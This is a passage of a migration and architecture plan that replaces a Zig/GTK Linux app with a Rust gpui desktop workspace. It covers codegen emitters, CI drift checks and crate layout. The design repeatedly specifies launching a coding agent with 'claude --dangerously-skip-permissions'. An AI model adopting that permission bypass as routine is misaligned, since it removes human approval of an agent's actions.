  - `apps/linux/src/core/**` — the app's **own** from-scratch sync engine, steer client, and git integration (the Zig analog of what the new `apps/desktop/crates/sync`, `crates/steer`, `crates/coding` will reimplement in Rust). This is reference-only history now; the proven algorithms it embodies are re-derived in Rust per [05-sync-engine-rust] / [08-remote-steer-publisher], and the hardening deltas already live on the archived branch `archive/native-desktop-wave1-2` if a line-level comparison is ever needed.
  - `apps/linux/src/core/domain/contract.generated.zig` — the committed Zig codegen output. This file **disappears with the directory**; §2.3 also removes the code path that writes it so it can never be regenerated.
  - `apps/linux/src/ui/**` — the GTK4 view tree.
  - Any `apps/linux/.gitignore`, README, or asset files tracked under the tree.

  After `git rm -r apps/linux`, confirm `git ls-files apps/linux` returns empty.

- **`docs/run-vm.md`** and **`docs/macos-setup-vm.md`** — the UTM-VM instructions for building/testing the Zig Linux app and the ghostty macOS VM. Dead once `apps/linux` is gone.
  **Before deleting, harvest any still-useful UTM / Ubuntu-on-Apple-Silicon testing notes into MEMORY** (`/Users/niach/.claude/projects/-Users-niach-WebstormProjects-exponential/memory/`). The new gpui desktop app still needs a real-GPU Linux box to validate rendering (wgpu path — Blade was removed from gpui in Feb 2026), so the VM-provisioning knowledge (UTM config, GPU passthrough caveats, `xdg-open`/OAuth-browser quirks that surfaced as **EXP-5**) is worth preserving as a fresh `reference_linux_desktop_vm.md` memory note before the source doc is removed. Do the MEMORY write first; delete the docs second.

### 2.2 `.gitignore`

Remove the now-dead Zig block and add the Rust build-output ignore. Concretely, delete these four lines:

```
# Zig (apps/linux)
.zig-cache
zig-out
temp/
```

and add (next to the other build-artifact ignores):

```
# Rust (apps/desktop)
/apps/desktop/target
```

Use the anchored `/apps/desktop/target` form (leading slash) so only the workspace-root `target/` is ignored, not any stray `target` elsewhere. Cargo places all build output for a workspace in a single root `target/`, so this one line covers every crate. **`Cargo.lock` is NOT ignored** — it is committed (see §2.4). Leave the `temp/` removal in place; if any non-Zig tooling still writes `temp/`, re-add it explicitly, but as of the cut it belonged to the Zig block.

### 2.3 CODEGEN — domain-contract: drop Zig, add Rust

**File:** `packages/domain-contract/scripts/generate.ts`. Ground truth: it currently emits Swift, Kotlin, **and Zig** from `contract.json`. Rip out the Zig path entirely and add a Rust path that writes a committed file into the new desktop workspace.

**DELETE from `generate.ts`:**
- The `HEADER_ZIG` template literal.
- The four Zig helpers: `snakeCase`, `identSuffix`, `zigStrArray`, `zigNamedValues`.
- The entire `const zig = \`...\`` template.
- `const zigPath = join(repoRoot, "apps/linux/src/core/domain/contract.generated.zig")`, its `mkdirSync(dirname(zigPath), …)`, its `writeFileSync(zigPath, zig)`, and its `console.log(\`Wrote ${zigPath}\`)`.
- The header comment's `and Zig (apps/linux)` phrasing (see header fix below).

**ADD a Rust emitter** that writes `apps/desktop/crates/domain/src/contract.generated.rs` (COMMITTED). It must emit, for parity with the Swift/Kotlin outputs:

1. A `pub const <NAME>_VALUES: &[&str] = &[…]` slice for every value list — `issueStatus`, `issuePriority`, `recurrenceUnit`, `workspaceRole`, `publicWritePolicy`, `commentKind`, `notificationType`, `prState`, `codingSessionStatus`, `platform`, `subscriberSource`, `issueEventType`.
2. `pub const ISSUE_STATUS_DISPLAY_ORDER: &[&str] = &[…]` and `pub const ISSUE_PRIORITY_DISPLAY_ORDER: &[&str] = &[…]` (falling back to `.values` when `displayOrder` is absent, matching the Swift `?? .values` behavior).
3. `pub const MODERATION_RESTRICTED_FIELDS: &[&str] = &[…]`.
4. `pub const RECURRENCE_INTERVALS: &[i32] = &[…]`.
5. SCREAMING_SNAKE per-value `&str` consts for the same prefixes Swift/Kotlin emit named values for: `workspaceRole`, `publicWritePolicy`, `commentKind`, `notificationType`, `prState`, `codingSessionStatus`, `platform`, `subscriberSource`, `issueEventType`. Naming: `<PREFIX_SCREAMING>_<VALUE_SCREAMING>`, e.g. `WORKSPACE_ROLE_OWNER`, `PR_STATE_MERGED`, `CODING_SESSION_STATUS_RUNNING`, `SUBSCRIBER_SOURCE_WIDGET_REPORTER`, `ISSUE_EVENT_TYPE_PR_OPENED`.

Add these Rust helpers alongside the existing Swift/Kotlin ones (the file already has `camelCase`/`pascalCase`; add screaming-snake variants):

```ts
function screamingSnake(s: string): string {
  return s
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2") // camelCase word breaks
    .replace(/[^A-Za-z0-9]+/g, "_")          // non-alnum → _
    .toUpperCase()
}

function rustStrSlice(name: string, values: string[]): string {
  return `pub const ${screamingSnake(name)}: &[&str] = &[${values
    .map((v) => `"${v}"`)
    .join(", ")}];`
}

function rustIntSlice(name: string, values: number[]): string {
  return `pub const ${screamingSnake(name)}: &[i32] = &[${values.join(", ")}];`
}

function rustNamedValues(prefix: string, values: string[]): string {
  return values
    .map(
      (v) =>
        `pub const ${screamingSnake(prefix)}_${screamingSnake(v)}: &str = "${v}";`
    )
    .join(`\n`)
}
```

The `rustStrSlice` calls take the `*Values` / `*DisplayOrder` names (e.g. `rustStrSlice("issueStatusValues", …)` → `ISSUE_STATUS_VALUES`), matching how the Swift/Kotlin emitters are invoked. Write with `mkdirSync(dirname(rustPath), { recursive: true })` + `writeFileSync(rustPath, rust)` where `const rustPath = join(repoRoot, "apps/desktop/crates/domain/src/contract.generated.rs")`, and add the matching `console.log(\`Wrote ${rustPath}\`)`.

**Header comment fix (top of `generate.ts`):** replace `Swift (iOS), Kotlin (Android), and Zig (apps/linux)` with `Swift (iOS), Kotlin (Android), and Rust (apps/desktop)`; and in the "committed generated files don't need a Node runtime" sentence swap the Zig path for `apps/desktop/crates/domain/src/contract.generated.rs`.

**The generated file's own header** (emitted `HEADER_RUST`) mirrors the others but as a Rust `//` comment:

```rust
// AUTO-GENERATED by packages/domain-contract/scripts/generate.ts — do not edit.
// Single source of truth: packages/domain-contract/contract.json.
```

**`contract.json` top-level `description`:** currently reads "Canonical enum values shared by the web, iOS, and Android clients. … The committed generated files (apps/ios/.../DomainContract.generated.swift, apps/android/.../DomainContract.generated.kt, apps/linux/.../contract.generated.zig) are checked in …". Update to name the desktop Rust file and drop the Zig one: "…shared by the web, iOS, Android, and desktop clients. … The committed generated files (apps/ios/.../DomainContract.generated.swift, apps/android/.../DomainContract.generated.kt, apps/desktop/crates/domain/src/contract.generated.rs) are checked in …".

**`packages/domain-contract/src/index.ts` header:** the comment "emits per-language constants under the mobile apps" should read "emits per-language constants for the iOS, Android, and desktop clients" (it currently says "mobile apps", which now excludes the desktop Rust target).

The `domain` crate re-exports these consts and layers the row structs, enum→icon/color tables, and tolerant string→native serde on top — that shape belongs to [03-desktop-architecture]. This section only guarantees `contract.generated.rs` exists, is committed, and byte-matches `contract.json`.

### 2.4 CODEGEN — design-tokens: add a Rust target (new)

**File:** `packages/design-tokens/scripts/generate.ts`. Ground truth: it emits **Kotlin (Compose) and Swift (SwiftUI)** — there is **no Zig target to remove here** (the Linux GTK theme was hand-authored). We are purely **adding** a third emitter that writes `apps/desktop/crates/theme/src/tokens.generated.rs` (COMMITTED), reusing the file's existing OKLCH→sRGB machinery (`oklchToRgb`, `srgbGamma`, `to255`, `parseColor` — all already return `Rgba { r,g,b,a }` in 0–255).

**DECISION (locked): emit a struct-of-bytes, not a packed hex integer.** gpui's color constructors are famously ambiguous — `rgb(0xRRGGBB)` (opaque, 3 bytes) vs `rgba(0xRRGGBBAA)` (4 bytes, alpha last) — and getting the byte order wrong silently produces wrong colors. We sidestep the whole hazard by emitting explicit named byte fields into a **hand-written** `Srgb8` struct that lives in `theme/src/lib.rs` (so the generated file has **zero gpui dependency** and can be unit-tested without a GPU). For every `palette` and `semantic` key:

```rust
pub const BACKGROUND: Srgb8 = Srgb8 { r: 37, g: 37, b: 37, a: 255 };
pub const DESTRUCTIVE: Srgb8 = Srgb8 { r: 228, g: 70, b: 60, a: 255 };
pub const BORDER: Srgb8 = Srgb8 { r: 255, g: 255, b: 255, a: 26 };
```

Radii and sizes emit as plain `f32` consts:

```rust
pub const SM: f32 = 6.0;
pub const MD: f32 = 8.0;
```

Naming: SCREAMING_SNAKE of the token key (`cardForeground` → `CARD_FOREGROUND`, `sidebarBorder` → `SIDEBAR_BORDER`). The radius/size sub-namespaces collide across groups only if keys repeat; they don't in `tokens.json`, but to be safe emit radii and sizes into Rust `pub mod radius { … }` and `pub mod size { … }` sub-modules while palette/semantic land at the crate-module top level (consumers read `tokens::BACKGROUND`, `tokens::radius::MD`). **Open question:** whether to also namespace palette vs semantic into `pub mod palette`/`pub mod semantic` — decision: **no**, keep them flat like the color consts so `theme/src/lib.rs`'s ThemeColor builder reads `tokens::PRIMARY` directly; the palette/semantic split is documentary only.

Rust emit helpers to add:

```ts
function rustSrgb8(name: string, input: string): string {
  const { r, g, b, a } = parseColor(input)
  return `pub const ${screamingSnake(name)}: Srgb8 = Srgb8 { r: ${r}, g: ${g}, b: ${b}, a: ${a} };`
}

function rustF32(name: string, v: number): string {
  // always a float literal so it's f32-typed
  return `pub const ${screamingSnake(name)}: f32 = ${Number.isInteger(v) ? v.toFixed(1) : v};`
}
```

**MUST — filter `$`-prefixed keys before mapping (same guard `emitKotlin`/`emitSwift` already use).** `tokens.json`'s `semantic`, `radius`, and `size` groups each carry a `"$comment"` key. A naive `Object.entries(tokens.semantic).map(([k, v]) => rustSrgb8(k, v))` would call `parseColor("Fixed brand accent colors…")` → **throws `Unparseable color`**, and for radius/size would emit a string body as an `f32` const (`rustF32("$comment", …)` → invalid Rust + a `_COMMENT` ident). Every Rust group loop MUST replicate the existing `.filter(([k]) => !k.startsWith('$'))` guard, e.g. `Object.entries(tokens.semantic).filter(([k]) => !k.startsWith('$')).map(([k, v]) => rustSrgb8(k, v))` — and likewise for `palette`, `radius`, and `size`. Without this the generator crashes at runtime and Phase-0 gate #2 (plus the CI `codegen-drift` job) can never pass.

(Reuse the same `screamingSnake` helper; if the two generators don't share a module, duplicate the 3-line helper — it's trivial and keeps the scripts standalone.) The emitted file opens with:

```rust
// AUTO-GENERATED by packages/design-tokens/scripts/generate.ts — do not edit.
// Single source of truth: packages/design-tokens/tokens.json.
use crate::Srgb8;
```

The `use crate::Srgb8;` line references the hand-written struct in `theme/src/lib.rs`:

```rust
// theme/src/lib.rs — HAND-WRITTEN (not generated)
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Srgb8 { pub r: u8, pub g: u8, pub b: u8, pub a: u8 }

impl Srgb8 {
    pub const fn to_rgba(self) -> gpui::Rgba { /* r/255.0, … */ }
    pub fn to_hsla(self) -> gpui::Hsla { self.to_rgba().into() }
}

pub mod tokens { include!("tokens.generated.rs"); }
```

Only `lib.rs` touches gpui; `tokens.generated.rs` stays gpui-free (it names only `Srgb8` and `f32`). The programmatic `gpui_component::Theme` / `ThemeColor` (Hsla) builder that consumes these consts is [03-desktop-architecture]'s concern — this section only guarantees the generated consts exist and are correct. `Srgb8`'s `to_rgba`/`to_hsla` are hand-written in `lib.rs` and thus survive regeneration.

**Generator header + `tokens.json` `$comment`:** the `generate.ts` top comment currently says "Currently wired: Android (Compose). iOS/macOS (SwiftUI) ships in the Mac handoff phase; Linux GTK already carries the matching theme." Replace with: "Wired: Android (Compose), iOS (SwiftUI), and desktop (Rust/gpui via the theme crate)." The `tokens.json` `$comment` currently enumerates "web …, Android (Compose), iOS/macOS (SwiftUI) and Linux (GTK)"; change to "web …, Android (Compose), iOS (SwiftUI), and the desktop app (Rust/gpui)". Drop every Zig / GTK / macOS-SwiftUI mention.

**No root `package.json` wiring is strictly required for design-tokens** (it already has its own `generate` script: `bun run --filter @exp/design-tokens generate`), but §2.7 adds it to the Commands doc.

### 2.5 Both generated Rust files stay COMMITTED

`apps/desktop/crates/domain/src/contract.generated.rs` and `apps/desktop/crates/theme/src/tokens.generated.rs` are checked into git — exactly like the Swift/Kotlin generated files today. Rationale: `cargo build` (and CI, and a fresh `git clone` on a machine with no Node/bun) must never need to run a TypeScript generator to compile the desktop app. The generators are a **dev-time refresh** step invoked only when `contract.json` / `tokens.json` change; the drift guard in §2.8 keeps the committed files honest. Do **not** add a `build.rs` that shells out to bun — that would reintroduce the Node dependency we're avoiding and break offline builds.

### 2.6 ADD `apps/desktop/` — the Rust Cargo workspace skeleton

Phase 0 lands the **empty-but-buildable** skeleton (the gate is a green `cargo build`, not a working app). Full crate contents belong to Phases 1–6; here we create the workspace scaffolding and stub crates so the tree exists and compiles.

```
apps/desktop/
├── Cargo.toml            # [workspace] members = ["crates/*"], resolver = "2"
├── Cargo.lock            # COMMITTED
├── rust-toolchain.toml   # channel = "stable"
├── .cargo/config.toml    # per-target link flags; taffy + gpui_macros opt-level = 3 in dev
├── assets/               # Inter TTF, Lucide icons, Info.plist / .desktop templates (git-tracked; empty placeholders ok in Phase 0)
└── crates/
    ├── app/       # bin `exp-desktop`
    ├── ui/
    ├── theme/     # src/tokens.generated.rs (committed) + hand-written lib.rs (Srgb8)
    ├── domain/    # src/contract.generated.rs (committed) + lib.rs re-export
    ├── sync/
    ├── api/
    ├── terminal/
    ├── steer/
    └── coding/
```

Root `apps/desktop/Cargo.toml`:

```toml
[workspace]
members = ["crates/*"]
resolver = "2"

[workspace.package]
edition = "2021"
version = "0.1.0"
license = "Apache-2.0"

[workspace.dependencies]
# gpui + backend selector + macros pinned to gpui-component's EXACT rev (LD-7).
# The concrete rev/tag is fixed in Phase 1 ([03-desktop-architecture]); Phase 0
# only needs the skeleton to compile, so heavy deps can be added crate-by-crate.
```

**Phase-0 minimalism:** to keep the gate honest and fast, the nine crates start as trivial `lib.rs`/`main.rs` stubs (`domain` and `theme` already carry their committed generated files + the hand-written `Srgb8`/re-export). `app/src/main.rs` can be `fn main() {}` in Phase 0; the gpui bootstrap arrives in Phase 1. This means Phase 0's `cargo build` does **not** yet pull gpui/alacritty/etc. — those land as each phase wires its crate — which keeps the Phase-0 gate a fast, dependency-light compile and avoids blocking the repo cut on resolving the pinned-gpui-rev toolchain question (that's a Phase-1 gate). **Open question, resolved:** `rust-toolchain.toml` pins `channel = "stable"` now; Phase 1 must **validate** stable against the pinned gpui rev's own CI (Zed historically needed nightly for some features but gpui-component builds on stable) and bump to a pinned `1.xx` if needed — flagged in [03-desktop-architecture] and [12-risks-open-questions], not a Phase-0 blocker.

`Cargo.lock` is generated by the first `cargo build` and committed (this is an application workspace, not a library — pinning transitive deps is correct). `.cargo/config.toml` carries the per-target niceties (macOS `MACOSX_DEPLOYMENT_TARGET`, Linux `pkg-config` hints, and `[profile.dev.package.taffy]` / `[profile.dev.package.gpui_macros] opt-level = 3` so layout/macro-heavy crates aren't dog-slow in debug — a known gpui ergonomic). `assets/` is embedded at build time via gpui's `AssetSource` (no runtime asset paths → `.app`/AppImage-safe); in Phase 0 the files can be placeholders, real Inter/Lucide/manifests land in Phase 1.

### 2.7 `CLAUDE.md` prose deltas (apply verbatim in intent)

Apply these edits so the living project doc reflects four surfaces. (The `docs/vision.md` and `docs/masterplan.md` re-wordings are Phase 8, per [10-unchanged-and-exp-traceability]; `CLAUDE.md` changes land in Phase 0 because Fable reads it every session.)

- **Monorepo tree** (the `apps/` block): remove the `linux/` line ("Native Zig + GTK4 desktop app …"); add `desktop/   # Cross-platform desktop IDE (Rust: gpui + gpui-component + alacritty_terminal; embedded `claude` coding sessions)`; annotate `ios/` as `# Native SwiftUI iOS app (Tuist + GRDB) — self-contained (ExpCore/ExpUI are iOS-only frameworks)`. In the same tree's `packages/` block, add the pre-existing-but-undocumented `design-tokens/  # OKLCH→sRGB theme tokens → Compose/SwiftUI/Rust` entry (it is now a first-class codegen target — §2.4 — and Fable must know to regenerate it).
- **Workspace-package-names note:** change the parenthetical "(The Linux desktop app `apps/linux` is a Zig project, not a bun workspace.)" to "(The desktop app `apps/desktop` is a Rust Cargo workspace, not a bun workspace.)". Also add `@exp/design-tokens` to the "Workspace package names" list on CLAUDE.md line 44 (it is currently omitted, a pre-existing gap) so the list matches the `packages/` tree.
- **Client-parity paragraph:** "all five clients (web, iOS, Android, macOS, Linux)" → **"all four clients (web, iOS, Android, desktop)"**; keep the fourteen-shape / proxy-count-14 wording. "refresh the Swift / Kotlin / Zig constants" → **"refresh the Swift / Kotlin / Rust constants"**. Replace the "Billing (Creem) and the admin console are intentionally web-only … native clients show no billing UI" sentence's neighbors as needed and add: **"The desktop app is the only client that runs coding sessions and publishes to the steer relay."**
- **Markdown-contract paragraph:** "iOS/macOS (cmark-gfm)" → **"iOS (cmark-gfm)"**; add the desktop to the interchange list: **"desktop (Rust — pulldown-cmark or comrak, GFM)"**. (The specific crate choice is [04-ui-parity-theming]'s; name both here so the contract paragraph stays accurate.) Everywhere the paragraph says "iOS/macOS", drop "/macOS".
- **Commands block:** add three dispatcher lines mirroring the android pattern —
  ```
  bun run dev:desktop                # cargo run -p app (apps/desktop, the gpui IDE)
  bun run build:desktop              # cargo build --release (apps/desktop)
  bun run test:desktop               # cargo test (apps/desktop workspace)
  ```
  and, next to the existing domain-contract generate line, add the design-tokens one and keep the (unchanged-command, now-Rust-emitting) domain-contract line:
  ```
  bun run --filter @exp/domain-contract generate   # Regenerate iOS + Android + desktop enum constants
  bun run --filter @exp/design-tokens generate     # Regenerate Android + iOS + desktop theme tokens
  ```
- **Coding-flow section (§ "Coding flow v2"):** replace "a thin **native launcher** on each desktop (macOS: `apps/ios/ExponentialMac`; Linux: `apps/linux`)" with **"a thin launcher inside the desktop IDE (`apps/desktop`, Rust)"**; replace "spawn `claude --dangerously-skip-permissions` in the embedded libghostty terminal" with **"…in the embedded terminal (alacritty_terminal-backed)"**. Everywhere "libghostty" appears, it becomes "alacritty_terminal".
- **Release-time checklist:** delete the "macOS notarization: the `Exponential-macOS` build ships hardened-runtime entitlements…" bullet and replace with a **Desktop (Rust/gpui) distribution** bullet: "macOS `.app` needs a Developer ID cert, real `codesign`, and `xcrun notarytool submit`; Linux ships as AppImage/`.deb`/tarball; artifacts are built unsigned by `.github/workflows/build-desktop.yml` on `desktop-v*` tags — signing/notarization are manual release-time steps." (The **iOS distribution** bullet stays.)

Do a final grep after the edits, **scoped to the files Phase 0 actually cleans** (Phase 0 does *not* rewrite `docs/vision.md` or `docs/handoff-mac.md` — those are deferred to Phase 8/§10 and still legitimately mention `apps/linux`/libghostty/Zig, so they must be excluded or the grep can never come back clean): `grep -rn -i 'apps/linux\|libghostty\|\bzig\b\|GTK' CLAUDE.md packages/domain-contract/contract.json packages/design-tokens/tokens.json .github/ | grep -vE 'docs/(masterplan|vision|handoff-mac)\.md'`. Config and CLAUDE.md must be clean (this is the Phase-0 gate's grep).

### 2.8 CI — `build-desktop.yml` (purely additive) + generator-drift guard

No macOS/Linux desktop workflow exists to delete (the native mac/linux apps never had CI beyond local builds), so this is 100% additive. Add `.github/workflows/build-desktop.yml`:

```yaml
name: build-desktop
on:
  push:
    tags: ["desktop-v*"]
  workflow_dispatch:

jobs:
  # Gate 1: the committed Rust generated files must match contract.json / tokens.json.
  codegen-drift:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
      - run: bun install --frozen-lockfile
      - run: bun run --filter @exp/domain-contract generate
      - run: bun run --filter @exp/design-tokens generate
      - name: Fail if the committed Rust files drifted
        run: git diff --exit-code -- apps/desktop/crates/domain/src/contract.generated.rs apps/desktop/crates/theme/src/tokens.generated.rs

  build:
    needs: codegen-drift
    strategy:
      matrix:
        include:
          - os: macos-14        # arm64
            target: aarch64-apple-darwin
          - os: ubuntu-latest   # x86_64
            target: x86_64-unknown-linux-gnu
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - name: Linux system deps (wgpu/gpui)
        if: runner.os == 'Linux'
        run: sudo apt-get update && sudo apt-get install -y libxkbcommon-dev libwayland-dev libxcb1-dev pkg-config
      - uses: dtolnay/rust-toolchain@stable
      - uses: Swatinem/rust-cache@v2
        with:
          workspaces: apps/desktop
      - run: cargo build --release --manifest-path apps/desktop/Cargo.toml
      - uses: actions/upload-artifact@v4
        with:
          name: exp-desktop-${{ matrix.target }}
          path: apps/desktop/target/release/exp-desktop
```

Notes for Fable:
- The **`codegen-drift` job is the staleness guard** the brief mandates: it re-runs both generators against the checked-in `contract.json`/`tokens.json` and fails the build if the committed Rust files would change. This is the CI enforcement of §2.5 — the same guarantee the Swift/Kotlin generated files rely on informally today, now hard-gated for the Rust files.
- Artifacts are **unsigned** (matching the android CI). Codesign/notarize/AppImage packaging are manual release-time steps per the updated Release-time checklist (§2.7) and Phase 8.
- The Linux `apt-get` deps list is the wgpu/gpui minimum (xkbcommon, wayland, xcb, pkg-config); [03-desktop-architecture] owns the definitive list — extend there if the Phase-1 build reveals more. Keep the matrix at macos-14(arm64) + ubuntu-latest(x86_64); Windows stays out (door open, not wired).
- Do **not** trigger on `push: master` — desktop builds are heavy and gated on the `desktop-v*` tag, unlike the web image which builds every push. `workflow_dispatch` gives a manual escape hatch.

### 2.9 Root `package.json` scripts

Add three dispatcher scripts next to the android ones; the `workspaces` array is **unchanged** (`["apps/*", "packages/*"]` — the glob still skips `apps/desktop` because it has no `package.json`):

```json
"dev:desktop": "cd apps/desktop && cargo run -p app",
"build:desktop": "cd apps/desktop && cargo build --release",
"test:desktop": "cd apps/desktop && cargo test",
```

(`cargo run -p app` runs the `app` crate's `exp-desktop` bin; keep `-p app` so it's unambiguous in a multi-crate workspace.) These mirror `android:build`'s `cd apps/android && ./gradlew …` shape — shelling out of the bun world into the native toolchain. Nothing else in root `package.json` changes.

### 2.10 Explicitly NO impact

To forestall scope creep, the following are **untouched** by the repo cut:
- **DB / schema / migrations:** nothing. The 14 synced Electric shapes and every `contract.json` enum value are identical pre/post. `run_configs` (the only new table) is added later by [07-ide-features], server-only, tRPC-accessed, never synced.
- **`packages/db-schema`, `packages/electric-protocol`, `packages/steer-ticket`, `packages/widget`, `packages/tsconfig`:** unchanged. `electric-protocol/fixtures/**` becomes the conformance vector set for the new Rust `sync::protocol` — consumed, not modified ([05-sync-engine-rust]).
- **`apps/web`, `apps/push-relay`, `apps/steer-relay`, `apps/marketing`, `apps/android`:** unchanged by this section.
- **`apps/ios`:** its **mac target deletion + self-containment** is [09-ios-cleanup]'s job, not this section's. Phase 0 leaves `apps/ios` exactly as-is; the only ios-adjacent Phase-0 edit is the one-word `CLAUDE.md` annotation calling it self-contained (which becomes true in Phase 7).
- **`bun.lock` / `workspaces`:** no churn (the whole point of the `package.json`-free desktop workspace).

### 2.11 Phase 0 gate (must all pass before Phase 1)

1. `bun install` is clean — **no `bun.lock` diff, no workspace churn** (proves the delete+add caused zero bun-side change).
2. `bun run --filter @exp/domain-contract generate && bun run --filter @exp/design-tokens generate` followed by `git diff --exit-code` on the two committed `apps/desktop/crates/**/*.generated.rs` files → **no diff** (the generators are deterministic and the committed files are current).
3. `cd apps/desktop && cargo build` → **green** on the empty skeleton.
4. `bun run build:web`, `bun run android:build`, and the iOS `xcodebuild` (per MEMORY's macOS/iOS build note) → **all still green** (the cut didn't break the surviving clients).
5. `grep -rn -i 'apps/linux\|libghostty\|\bzig\b' CLAUDE.md packages/domain-contract/contract.json packages/design-tokens/tokens.json .github/ | grep -vE 'docs/(masterplan|vision|handoff-mac)\.md'` finds **no residual references** (the grep is scoped to the files Phase 0 cleans; `docs/masterplan.md`, `docs/vision.md`, and `docs/handoff-mac.md` are excluded because Phase 8/§10 rewrites them, not Phase 0). `git ls-files apps/linux` is empty; `docs/run-vm.md` and `docs/macos-setup-vm.md` are gone; the reusable VM notes live in MEMORY.


---

## 3. Desktop app architecture (Rust: crates, threading, four pillars, build & packaging)

This section is the load-bearing engineering spec for `apps/desktop` — the new
cross-platform desktop IDE that replaces both dying native codebases (the Zig +
GTK4 + libghostty `apps/linux` app and the SwiftUI `apps/ios/ExponentialMac`
target). It fixes the crate topology, the threading model, the four external
pillars we build on, the app shell/bootstrap, and the build/packaging story.
Downstream sections own the details: §04 owns theming and per-widget UI parity,
§05 owns the sync engine internals, §06 owns the terminal, §07 owns the IDE
features (Start-coding, run configs, diff, doctor), §08 owns the steer publisher,
§09 owns the parallel iOS cleanup. Where this section names an interface it stops
at the boundary and defers to those sections by name.

`apps/desktop` is a **standalone Rust Cargo workspace**, not a bun workspace. The
root `apps/*` glob in `package.json` only picks up directories that contain a
`package.json`; `apps/desktop` deliberately has none (verified: `apps/linux`,
also package.json-free, never appeared in `bun.lock`). So `bun install` ignores
it entirely and the Rust toolchain owns it end to end.

### 3.1 Cargo workspace layout & the nine crates

```
apps/desktop/
├── Cargo.toml              # [workspace] members=["crates/*"], resolver="2"
├── Cargo.lock              # COMMITTED — this is an app, not a library
├── rust-toolchain.toml     # channel = "1.96.0" (validated by Spike B; see §3.7)
├── .cargo/config.toml      # per-target link flags + dev opt-level overrides
├── assets/                 # Inter TTF, Lucide icons, Info.plist / .desktop templates
└── crates/
    ├── app/        # bin `exp-desktop`
    ├── ui/
    ├── theme/
    ├── domain/
    ├── sync/
    ├── api/
    ├── terminal/
    ├── steer/
    └── coding/
```

Nine crates, one binary. The split exists to keep the sync engine and its
protocol/store/manager **gpui-free and headless-testable**, to keep generated
code isolated in its own crates, and to let the terminal/steer/coding subsystems
evolve without dragging the whole UI tree through a recompile.

**`app`** — the only binary crate (`[[bin]] name = "exp-desktop"`). Owns the gpui
bootstrap, the `Root` + `Workspace` (`DockArea`) composition, multi-window
management, the dependency-injection wiring that hands the `Store`/`Theme`/`api`
client to the view tree, the `actions!` + keymap tables, the macOS menubar, and
the OAuth browser-open plumbing. Thin — it wires, it does not implement.

**`ui`** — every gpui view, a 1:1 mirror of the web app built out of
gpui-component widgets: `sidebar`, `issue_list` (virtualized), `issue_detail`,
`markdown_editor` + `mention_popover`, `filter_bar`/`pills`,
`create_issue_dialog`, `create_project`/`create_workspace`, `inbox`, `my_issues`,
`settings/*`, `account`, `diff_view`, `run_bar`. Details in §04. Depends on
everything gpui-facing.

**`theme`** — `src/tokens.generated.rs` (emitted from `@exp/design-tokens`, and
**committed**) holding the palette as `Srgb8` byte structs, plus a hand-written
`Srgb8 → gpui::Rgba` bridge and a builder that assembles the gpui-component
`ThemeColor` (whose fields are `Hsla`) programmatically from those consts. The
design tokens are the single source of truth — there is no hand-authored theme
JSON. See §04 for the token mapping.

**`domain`** — `src/contract.generated.rs` (emitted from `@exp/domain-contract`,
**committed**) plus the row structs, the enums with their icon/color metadata,
the status/priority option tables, and the tolerant `string → native` serde
(unknown enum variants degrade gracefully rather than failing the whole shape
decode). This is the Rust analogue of the Swift/Kotlin/Zig constant emitters that
`bun run --filter @exp/domain-contract generate` already produces. gpui-free.

**`sync`** — the from-scratch Electric client. `protocol.rs`, `client.rs`,
`store.rs` (rusqlite/WAL), `manager.rs` are **all gpui-free and fixture-tested**
against `packages/electric-protocol`; `collections.rs` is the thin gpui glue that
projects the store into reactive `Entity`-backed collections. Depends only on
`domain`. Full spec in §05.

**`api`** — the tRPC-over-HTTP mutation client, the `awaitTxId` sync gate (mirrors
the web `generateTxId` handshake), the Better Auth session lifecycle, the
auto-minted hidden `expu_` personal key (EXP-2a), and `login.rs` /
`token_store.rs` (file-based `0600` store — never the OS keyring; locked 2026-07-03) / the `opener` chain for
OAuth. Consumed by `ui` for mutations and by `coding`/`steer` for tokens. gpui
usage is minimal (it surfaces async results the UI awaits).

**`terminal`** — `pty.rs` (portable-pty master), `emulator.rs`
(alacritty_terminal `Term` + vte `Processor`), `read_loop.rs` (**the steer
tee**), `keys.rs` (clean reimplementation of `to_esc_str`), `mouse.rs`,
`element.rs` (the gpui grid Element: `layout_grid` + paint), `tab.rs` +
`manager.rs` (JetBrains-style multi-tab), `steer.rs` (publisher glue). §06.

**`steer`** — the relay **publisher**: `control_channel.rs` (device presence +
inbound `start_session`) and `publisher.rs` (tee out, inject, resize, claim/kill,
ring replay, auto-reconnect) over `tokio-tungstenite` + `rustls` (ws and wss).
Wire protocol and ticket format are frozen (`packages/steer-ticket`,
`apps/steer-relay`). §08.

**`coding`** — the Start-coding launcher: git worktree, `exp/<IDENTIFIER>` branch,
token-embedded remote (never logged), `.mcp.json`, `PROMPT.md`, and the
`claude --dangerously-skip-permissions` spawn. §07.

#### Dependency direction (enforced, acyclic)

```
app ──▶ ui ──▶ theme
        ui ──▶ domain
        ui ──▶ sync ──▶ domain
        ui ──▶ api ──▶ domain
        ui ──▶ terminal
        ui ──▶ coding ──▶ api, terminal
        ui ──▶ steer   ──▶ terminal, api
app ──▶ (all of the above, for DI wiring)
```

Rules that must hold (a CI `cargo-deny`/graph check or a simple review gate keeps
them honest):

- `sync::{protocol, client, store, manager}` and `domain` **must not** depend on
  `gpui` or `gpui-component`. They are pure Rust and are unit-tested without a
  running `App`. Only `sync::collections` links gpui.
- `theme`, `domain`, `sync`, `api`, `terminal`, `steer`, `coding` never depend on
  `ui` (no back-edges).
- Everything that touches the screen depends on `gpui` + `gpui-component`; nothing
  else does.

The workspace `Cargo.toml` pins the three gpui crates to **gpui-component's exact
git rev** so the whole tree resolves one gpui (LD-7):

```toml
# apps/desktop/Cargo.toml
[workspace]
members  = ["crates/*"]
resolver = "2"

[workspace.dependencies]
# Pinned to the SAME rev gpui-component pins (verified in its Cargo.toml).
# Crate versions at this rev (confirmed by Spike B): gpui 0.2.2, gpui_platform 0.1.0, gpui_macros 0.1.0.
gpui          = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
gpui_platform = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe", features = ["font-kit", "x11", "wayland", "runtime_shaders"] }
gpui_macros   = { git = "https://github.com/zed-industries/zed", rev = "1d217ee39d381ac101b7cf49d3d22451ac1093fe" }
# gpui-component is pinned by GIT REV, never by crates.io version. WARNING: crates.io
